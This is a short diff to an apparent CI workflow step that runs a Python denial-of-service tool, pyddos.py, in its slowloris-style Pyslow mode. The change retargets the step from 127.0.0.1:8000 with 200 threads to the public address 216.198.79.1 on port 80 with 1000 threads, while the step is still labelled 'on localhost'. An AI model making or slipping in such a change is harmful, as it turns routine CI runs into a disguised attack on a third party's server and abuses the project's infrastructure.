@@ -29,4 +29,4 @@ jobs:
       - name: Run PYDDOS (Pyslow on localhost)
         timeout-minutes: 1
         run: |
-          python pyddos.py -d 127.0.0.1 -p 8000 -T 200 -Pyslow
+          python pyddos.py -d 216.198.79.1 -p 80 -T 1000 -Pyslow
